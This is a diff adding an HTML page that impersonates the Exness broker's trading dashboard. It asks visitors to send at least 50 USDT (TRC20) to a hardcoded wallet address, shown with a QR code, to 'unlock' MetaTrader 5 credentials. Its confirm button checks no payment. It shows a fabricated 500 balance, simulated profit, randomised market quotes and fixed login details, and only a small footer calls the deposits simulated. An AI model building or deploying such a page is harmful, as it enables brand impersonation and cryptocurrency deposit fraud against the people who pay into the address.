@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Exness | Dashboard - Depósito USDT TRC20</title>
+    <!-- Google Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- QR Code Library -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at 20% 30%, #0a0c18, #05070f);
+            min-height: 100vh;
+            color: #eef2ff;
+        }
+
+        /* Navbar */
+        .navbar {
+            background: rgba(10, 14, 23, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-area i {
+            font-size: 1.8rem;
+            color: #3b82f6;
+        }
+
+        .logo-area h1 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #7c8ef8);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .user-info-nav {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: rgba(25, 32, 55, 0.7);
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+        }
+
+        .user-info-nav i {
+            color: #4ade80;
+        }
+
+        .logout-nav {
+            background: rgba(239, 68, 68, 0.2);
+            border: none;
+            color: #fca5a5;
+            padding: 0.4rem 1rem;
+            border-radius: 1.5rem;
+            cursor: pointer;
+            font-weight: 500;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+
+        .logout-nav:hover {
+            background: #ef4444;
+            color: white;
+        }
+
+        /* Main container */
+        .dashboard-home {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1.5rem;
+        }
+
+        /* Welcome Banner */
+        .welcome-banner {
+            background: linear-gradient(125deg, rgba(59,130,246,0.15), rgba(16,25,55,0.6));
+            border-radius: 2rem;
+            padding: 1.8rem 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(59,130,246,0.3);
+            backdrop-filter: blur(8px);
+        }
+
+        .welcome-banner h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+
+        .welcome-banner p {
+            color: #9ca3cf;
+            margin-top: 0.5rem;
+        }
+
+        /* Stats Grid - Balance en 0 hasta depositar */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .stat-card {
+            background: rgba(18, 24, 40, 0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 1.5rem;
+            padding: 1.3rem 1.5rem;
+            border: 1px solid #252c44;
+            transition: 0.2s;
+        }
+
+        .stat-title {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #8b92b0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .stat-value {
+            font-size: 2.2rem;
+            font-weight: 800;
+            margin-top: 0.6rem;
+            color: #f0f3ff;
+        }
+
+        /* Two columns */
+        .two-columns {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 1.8rem;
+            margin-bottom: 2rem;
+        }
+
+        @media (max-width: 880px) {
+            .two-columns {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Deposit Card */
+        .deposit-card, .credentials-card {
+            background: rgba(12, 16, 28, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 1.8rem;
+            border: 1px solid #2a2f48;
+            overflow: hidden;
+        }
+
+        .card-header {
+            padding: 1.2rem 1.5rem;
+            background: rgba(0, 0, 0, 0.3);
+            border-bottom: 1px solid #232842;
+            font-weight: 700;
+            font-size: 1.2rem;
+        }
+
+        .card-body {
+            padding: 1.5rem;
+        }
+
+        .usdt-address {
+            background: #05070f;
+            padding: 0.8rem;
+            border-radius: 1rem;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 1rem 0;
+            border: 1px solid #3b82f640;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .copy-btn {
+            background: #1e293b;
+            border: none;
+            padding: 0.4rem 1rem;
+            border-radius: 2rem;
+            color: #94a3f8;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-family: inherit;
+        }
+
+        .qr-container {
+            display: flex;
+            justify-content: center;
+            margin: 1.5rem 0;
+            padding: 1rem;
+            background: white;
+            border-radius: 1rem;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .btn-deposit {
+            width: 100%;
+            background: linear-gradient(95deg, #f0b90b, #f5a623);
+            border: none;
+            padding: 1rem;
+            border-radius: 1.5rem;
+            font-weight: 800;
+            font-size: 1rem;
+            color: #0a0c18;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 0.5rem;
+            font-family: inherit;
+        }
+
+        .btn-deposit:hover {
+            transform: scale(0.98);
+            box-shadow: 0 8px 20px rgba(240,185,11,0.3);
+        }
+
+        /* Credentials Display */
+        .credentials-display {
+            background: #0b0e1a;
+            border-radius: 1.2rem;
+            padding: 1.2rem;
+            margin: 1rem 0;
+        }
+
+        .cred-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid #1f253e;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .cred-label {
+            font-weight: 500;
+            color: #9ca3cf;
+        }
+
+        .cred-value {
+            font-family: monospace;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            background: #00000030;
+            padding: 0.2rem 0.6rem;
+            border-radius: 0.6rem;
+        }
+
+        .server-badge {
+            background: #1e3a8a60;
+            padding: 0.3rem 0.8rem;
+            border-radius: 2rem;
+            font-size: 0.8rem;
+        }
+
+        .alert-deposit {
+            background: #1e293b;
+            border-left: 4px solid #f0b90b;
+            padding: 0.8rem;
+            border-radius: 1rem;
+            font-size: 0.8rem;
+            margin-top: 1rem;
+        }
+
+        .alert-success {
+            background: #0a2e1f;
+            border-left-color: #4ade80;
+        }
+
+        .market-table {
+            background: rgba(12, 16, 28, 0.8);
+            border-radius: 1.5rem;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+
+        .market-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.7rem;
+            border-bottom: 1px solid #1f253e;
+        }
+
+        .positive {
+            color: #4ade80;
+        }
+        .negative {
+            color: #f87171;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 1.5rem;
+            font-size: 0.7rem;
+            color: #5b6380;
+        }
+
+        .blink-warning {
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- NAVBAR -->
+<div class="navbar">
+    <div class="logo-area">
+        <i class="fas fa-chart-line"></i>
+        <h1>exness</h1>
+    </div>
+    <div style="display: flex; gap: 1rem; align-items: center;">
+        <div class="user-info-nav">
+            <i class="fas fa-user-circle"></i>
+            <span id="navUserName">Visitante</span>
+        </div>
+        <button class="logout-nav" id="logoutBtnMain"><i class="fas fa-sign-out-alt"></i> Reiniciar</button>
+    </div>
+</div>
+
+<div class="dashboard-home" id="mainDashboard">
+    <!-- Welcome Banner -->
+    <div class="welcome-banner">
+        <h2><i class="fas fa-tachometer-alt"></i> Trading Dashboard</h2>
+        <p>Depósito mínimo 50 USDT (TRC20) para activar tus credenciales de trading</p>
+    </div>
+
+    <!-- Stats - Todo en CERO hasta depositar -->
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-title"><i class="fas fa-wallet"></i> Balance Total</div>
+            <div class="stat-value" id="totalBalance">$0.00</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-title"><i class="fas fa-chart-simple"></i> Equity</div>
+            <div class="stat-value" id="totalEquity">$0.00</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-title"><i class="fas fa-percent"></i> Profit Hoy</div>
+            <div class="stat-value" id="todayProfit">$0.00</div>
+        </div>
+    </div>
+
+    <!-- Two Columns: Deposit + Credenciales -->
+    <div class="two-columns">
+        <!-- DEPOSIT SECTION (USDT TRC20) -->
+        <div class="deposit-card">
+            <div class="card-header"><i class="fab fa-usdt"></i> Depósito USDT (TRC20)</div>
+            <div class="card-body">
+                <div style="font-size: 0.85rem; margin-bottom: 0.5rem;">🔗 Red: <strong>TRC20 (Tron Network)</strong></div>
+                <div class="usdt-address">
+                    <span id="usdtAddress">TCAgtcQNCecCRn5fV7ZrMa5euFzSyzPUu5</span>
+                    <button class="copy-btn" id="copyAddressBtn"><i class="fas fa-copy"></i> Copiar</button>
+                </div>
+                <div id="qrCodeContainer" class="qr-container"></div>
+                <button class="btn-deposit" id="confirmDepositBtn"><i class="fas fa-arrow-down"></i> Confirmar Depósito</button>
+                <div class="alert-deposit">
+                    <i class="fas fa-clock"></i> Al confirmar tu depósito, se activarán tus credenciales MT5 y el balance se actualizará automáticamente.
+                </div>
+            </div>
+        </div>
+
+        <!-- CREDENCIALES DE TRADING (Se muestran tras depósito) -->
+        <div class="credentials-card" id="credentialsCard">
+            <div class="card-header"><i class="fas fa-key"></i> Credenciales de Trading MT5</div>
+            <div class="card-body">
+                <div id="credentialsPlaceholder" style="text-align: center; color: #7c85a5; padding: 2rem;">
+                    <i class="fas fa-lock" style="font-size: 2.5rem; opacity: 0.6;"></i>
+                    <p style="margin-top: 1rem;">🔒 Realiza un depósito para desbloquear<br>tus datos de acceso a MetaTrader 5</p>
+                    <p style="font-size: 0.7rem; margin-top: 0.8rem;">Mínimo 50 USDT · Activación inmediata</p>
+                </div>
+                <div id="credentialsContent" style="display: none;">
+                    <div class="credentials-display">
+                        <div class="cred-row">
+                            <span class="cred-label"><i class="fas fa-user"></i> Usuario MT5:</span>
+                            <span class="cred-value" id="displayUser">---</span>
+                        </div>
+                        <div class="cred-row">
+                            <span class="cred-label"><i class="fas fa-lock"></i> Contraseña:</span>
+                            <span class="cred-value" id="displayPass">---</span>
+                        </div>
+                        <div class="cred-row">
+                            <span class="cred-label"><i class="fas fa-server"></i> Servidor:</span>
+                            <span class="cred-value server-badge" id="displayServer">---</span>
+                        </div>
+                    </div>
+                    <div class="alert-deposit alert-success" id="successCredAlert">
+                        <i class="fas fa-check-circle"></i> Credenciales activas. Inicia sesión en MT5 con estos datos.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Live Market Information -->
+    <div class="market-table">
+        <h4 style="margin-bottom: 1rem;"><i class="fas fa-chart-line"></i> Mercados en Vivo (Cotizaciones)</h4>
+        <div id="marketList">
+            <div class="market-row"><span>EUR/USD</span><span id="eurusd">1.08932</span><span class="positive">▲ 0.12%</span></div>
+            <div class="market-row"><span>GBP/JPY</span><span id="gbpjpy">190.52</span><span class="negative">▼ 0.08%</span></div>
+            <div class="market-row"><span>BTC/USD</span><span id="btc">63,214</span><span class="positive">▲ 2.4%</span></div>
+            <div class="market-row"><span>XAU/USD (Gold)</span><span id="gold">2,352.10</span><span class="positive">▲ 0.31%</span></div>
+        </div>
+    </div>
+    <div class="footer">
+        <i class="fas fa-shield-alt"></i> Depósitos simulados en USDT (TRC20) · Las credenciales son fijas para demostración
+    </div>
+</div>
+
+<script>
+    // ========== CREDENCIALES FIJAS SOLICITADAS ==========
+    const MT5_USER = "163101548";
+    const MT5_PASSWORD = "Exness123456@";
+    const MT5_SERVER = "EXNESS-MT5Real22";
+
+    // Estados de la aplicación
+    let depositCompleted = false;      // si ya se realizó el depósito (credenciales desbloqueadas)
+    let currentBalance = 0.00;         // Inicia en CERO, se actualiza tras depósito
+    
+    // Monto de depósito simulado (el usuario puede "depositar" cualquier monto, fijamos 500 para ejemplo)
+    const DEPOSIT_AMOUNT = 500.00;     // Simula que el usuario deposita 500 USDT
+    
+    // Referencias DOM
+    const balanceSpan = document.getElementById('totalBalance');
+    const equitySpan = document.getElementById('totalEquity');
+    const profitSpan = document.getElementById('todayProfit');
+    const navUserNameSpan = document.getElementById('navUserName');
+    const placeholderDiv = document.getElementById('credentialsPlaceholder');
+    const credentialsDiv = document.getElementById('credentialsContent');
+    const displayUserSpan = document.getElementById('displayUser');
+    const displayPassSpan = document.getElementById('displayPass');
+    const displayServerSpan = document.getElementById('displayServer');
+    const confirmDepositBtn = document.getElementById('confirmDepositBtn');
+    const copyBtn = document.getElementById('copyAddressBtn');
+    const usdtAddressSpan = document.getElementById('usdtAddress');
+    const logoutMain = document.getElementById('logoutBtnMain');
+    
+    // Actualizar UI de credenciales según estado del depósito
+    function updateCredentialsUI() {
+        if (depositCompleted) {
+            placeholderDiv.style.display = 'none';
+            credentialsDiv.style.display = 'block';
+            // Asignamos las credenciales fijas
+            displayUserSpan.innerText = MT5_USER;
+            displayPassSpan.innerText = MT5_PASSWORD;
+            displayServerSpan.innerText = MT5_SERVER;
+        } else {
+            placeholderDiv.style.display = 'flex';
+            credentialsDiv.style.display = 'none';
+        }
+    }
+    
+    // Actualizar los valores del balance y métricas (todo empieza en 0, tras deposito se setea)
+    function updateBalancesUI() {
+        // Formatear con separadores de miles
+        const formattedBalance = currentBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        balanceSpan.innerText = `$${formattedBalance}`;
+        
+        // Equity = Balance + (simulación de ganancia flotante pequeña si hay balance > 0)
+        let equity = currentBalance;
+        let dailyProfit = 0;
+        if (currentBalance > 0) {
+            // Simular un pequeño profit flotante del 0.5% para dar sensación real (solo si hay saldo)
+            const floatingProfit = currentBalance * 0.005;
+            equity = currentBalance + floatingProfit;
+            dailyProfit = floatingProfit;
+        } else {
+            equity = 0;
+            dailyProfit = 0;
+        }
+        
+        const formattedEquity = equity.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        equitySpan.innerText = `$${formattedEquity}`;
+        
+        if (dailyProfit >= 0) {
+            profitSpan.innerText = `+$${dailyProfit.toFixed(2)}`;
+            profitSpan.style.color = "#4ade80";
+        } else {
+            profitSpan.innerText = `-$${Math.abs(dailyProfit).toFixed(2)}`;
+            profitSpan.style.color = "#f87171";
+        }
+        
+        // Si el balance es cero, aseguramos que todo se vea en cero sin decimales extra
+        if (currentBalance === 0) {
+            equitySpan.innerText = "$0.00";
+            profitSpan.innerText = "$0.00";
+        }
+    }
+    
+    // Procesar el depósito: activa credenciales y añade balance (partiendo de 0)
+    function processDeposit() {
+        if (depositCompleted) {
+            alert("✅ Ya has activado tus credenciales. Tus datos de acceso están visibles abajo.");
+            return;
+        }
+        
+        // Simular confirmación de depósito: el usuario ha transferido USDT
+        currentBalance = DEPOSIT_AMOUNT;   // Balance empieza en 0 y ahora se actualiza a 500 USDT
+        depositCompleted = true;
+        
+        // Actualizar UI
+        updateBalancesUI();
+        updateCredentialsUI();
+        
+        // Guardar en localStorage para persistencia (simulación de sesión)
+        localStorage.setItem('exness_deposit_active', 'true');
+        localStorage.setItem('exness_balance', currentBalance.toString());
+        
+        // Notificación estilo broker
+        alert(`✅ Depósito de ${DEPOSIT_AMOUNT} USDT (TRC20) confirmado exitosamente.\n\n🎉 Tus credenciales de trading han sido generadas:\n📌 Usuario: ${MT5_USER}\n🔑 Contraseña: ${MT5_PASSWORD}\n🖥️ Servidor: ${MT5_SERVER}\n\nYa puedes operar en MetaTrader 5.`);
+        
+        // Cambiar texto del botón para reflejar estado
+        confirmDepositBtn.innerHTML = '<i class="fas fa-check-circle"></i> Depósito Acreditado';
+        confirmDepositBtn.disabled = true;
+        confirmDepositBtn.style.opacity = "0.7";
+        confirmDepositBtn.style.cursor = "not-allowed";
+        
+        // Mostrar mensaje adicional en el área de credenciales para resaltar
+        const credAlertDiv = document.querySelector('#successCredAlert');
+        if (credAlertDiv) {
+            credAlertDiv.innerHTML = '<i class="fas fa-check-circle"></i> Credenciales activas. Inicia sesión en MT5 con estos datos. Balance disponible: $' + currentBalance.toFixed(2);
+        }
+    }
+    
+    // Copiar dirección USDT
+    function copyAddress() {
+        const address = usdtAddressSpan.innerText;
+        navigator.clipboard.writeText(address).then(() => {
+            alert("✅ Dirección USDT (TRC20) copiada: " + address);
+        }).catch(() => {
+            alert("❌ No se pudo copiar, selecciona manualmente: " + address);
+        });
+    }
+    
+    // Generar código QR con la dirección USDT
+    function generateQR() {
+        const address = usdtAddressSpan.innerText;
+        const qrContainer = document.getElementById('qrCodeContainer');
+        qrContainer.innerHTML = "";
+        try {
+            new QRCode(qrContainer, {
+                text: address,
+                width: 130,
+                height: 130,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.M
+            });
+        } catch(e) {
+            qrContainer.innerHTML = "<p style='color:white;font-size:12px;'>QR no disponible</p>";
+        }
+    }
+    
+    // Actualizar precios de mercado (simulación)
+    function updateMarketPrices() {
+        const eurusd = (1.08932 + (Math.random() * 0.002 - 0.001)).toFixed(5);
+        const gbpjpy = (190.52 + (Math.random() * 0.3 - 0.15)).toFixed(2);
+        const btc = (63214 + Math.floor(Math.random() * 400 - 200)).toFixed(0);
+        const gold = (2352.10 + (Math.random() * 1.8 - 0.9)).toFixed(2);
+        
+        document.getElementById('eurusd').innerHTML = eurusd;
+        document.getElementById('gbpjpy').innerHTML = gbpjpy;
+        document.getElementById('btc').innerHTML = Number(btc).toLocaleString();
+        document.getElementById('gold').innerHTML = gold;
+        
+        // Actualizar los porcentajes de cambio dinámicamente
+        const rows = document.querySelectorAll('.market-row');
+        if (rows.length >= 4) {
+            const eurChange = (eurusd - 1.08932).toFixed(4);
+            const eurClass = eurChange >= 0 ? 'positive' : 'negative';
+            const eurSymbol = eurChange >= 0 ? '▲' : '▼';
+            if (rows[0] && !rows[0].querySelector('.dynamic-change')) {
+                let span = rows[0].querySelector('.positive, .negative');
+                if (span) span.innerText = `${eurSymbol} ${(Math.abs(eurChange)*100).toFixed(2)}%`;
+            }
+            
+            const gbpChange = (gbpjpy - 190.52).toFixed(2);
+            const gbpClass = gbpChange >= 0 ? 'positive' : 'negative';
+            const gbpSymbol = gbpChange >= 0 ? '▲' : '▼';
+            if (rows[1]) {
+                let span = rows[1].querySelector('.positive, .negative');
+                if (span) span.innerText = `${gbpSymbol} ${(Math.abs(gbpChange/190.52*100)).toFixed(2)}%`;
+            }
+            
+            const btcChange = (btc - 63214);
+            const btcSymbol = btcChange >= 0 ? '▲' : '▼';
+            if (rows[2]) {
+                let span = rows[2].querySelector('.positive, .negative');
+                if (span) span.innerText = `${btcSymbol} ${(Math.abs(btcChange/63214*100)).toFixed(2)}%`;
+            }
+            
+            const goldChange = (gold - 2352.10).toFixed(2);
+            const goldSymbol = goldChange >= 0 ? '▲' : '▼';
+            if (rows[3]) {
+                let span = rows[3].querySelector('.positive, .negative');
+                if (span) span.innerText = `${goldSymbol} ${(Math.abs(goldChange/2352.10*100)).toFixed(2)}%`;
+            }
+        }
+    }
+    
+    // Reiniciar todo (simula cierre de sesión / reset)
+    function resetDashboard() {
+        // Limpiar localStorage
+        localStorage.removeItem('exness_deposit_active');
+        localStorage.removeItem('exness_balance');
+        
+        // Resetear estados
+        depositCompleted = false;
+        currentBalance = 0.00;
+        
+        // Actualizar UI
+        updateBalancesUI();
+        updateCredentialsUI();
+        
+        // Restaurar botón de depósito
+        confirmDepositBtn.innerHTML = '<i class="fas fa-arrow-down"></i> Confirmar Depósito';
+        confirmDepositBtn.disabled = false;
+        confirmDepositBtn.style.opacity = "1";
+        confirmDepositBtn.style.cursor = "pointer";
+        
+        // Limpiar mensaje de alerta en credenciales si existe
+        const credAlertDiv = document.querySelector('#successCredAlert');
+        if (credAlertDiv) {
+            credAlertDiv.innerHTML = '<i class="fas fa-check-circle"></i> Credenciales activas. Inicia sesión en MT5 con estos datos.';
+        }
+        
+        alert("🔄 Sesión reiniciada. El balance ha sido restablecido a $0.00 y las credenciales están bloqueadas. Realiza un nuevo depósito para activarlas.");
+    }
+    
+    // Cargar estado persistente desde localStorage (si existe)
+    function loadPersistedState() {
+        const savedDeposit = localStorage.getItem('exness_deposit_active');
+        const savedBalance = localStorage.getItem('exness_balance');
+        if (savedDeposit === 'true') {
+            depositCompleted = true;
+            if (savedBalance && !isNaN(parseFloat(savedBalance))) {
+                currentBalance = parseFloat(savedBalance);
+            } else {
+                currentBalance = DEPOSIT_AMOUNT;
+            }
+            updateBalancesUI();
+            updateCredentialsUI();
+            // Deshabilitar botón si ya estaba depositado
+            confirmDepositBtn.innerHTML = '<i class="fas fa-check-circle"></i> Depósito Acreditado';
+            confirmDepositBtn.disabled = true;
+            confirmDepositBtn.style.opacity = "0.7";
+            confirmDepositBtn.style.cursor = "not-allowed";
+        } else {
+            // Asegurar que todo queda en cero
+            currentBalance = 0.00;
+            depositCompleted = false;
+            updateBalancesUI();
+            updateCredentialsUI();
+        }
+    }
+    
+    // Event Listeners
+    confirmDepositBtn.addEventListener('click', processDeposit);
+    copyBtn.addEventListener('click', copyAddress);
+    logoutMain.addEventListener('click', resetDashboard);
+    
+    // Inicialización cuando carga la página
+    window.addEventListener('load', () => {
+        generateQR();
+        loadPersistedState();
+        updateMarketPrices();
+        navUserNameSpan.innerText = "TraderPro";
+        
+        // Actualizar mercado cada 4 segundos
+        setInterval(updateMarketPrices, 4200);
+        
+        // Si no hay depósito, se puede agregar un pequeño efecto en botón
+        if (!depositCompleted) {
+            // Opcional: ningún balance flotante extra
+        }
+        
+        // Asegurar que los estilos de mercado se vean consistentes
+        const styleFix = document.createElement('style');
+        styleFix.textContent = `.market-row span:last-child { font-weight: 500; }`;
+        document.head.appendChild(styleFix);
+    });
+</script>
+</body>
+</html>
